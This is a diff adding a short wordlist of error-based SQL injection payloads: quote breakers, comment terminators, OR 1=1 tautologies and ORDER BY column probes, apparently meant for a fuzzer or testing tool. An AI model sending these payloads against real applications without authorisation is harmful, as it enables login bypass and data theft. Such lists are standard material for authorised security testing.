@@ -1,0 +1,27 @@
+# Error-based SQL injection payloads
+'
+''
+`
+``
+'--
+'#
+'/*
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"#
+') OR ('1'='1
+') OR ('1'='1'--
+')) OR (('1'='1
+' OR 1=1--
+" OR 1=1--
+OR 1=1--
+' OR 'a'='a
+" OR "a"="a
+') OR ('a'='a
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' ORDER BY 100--
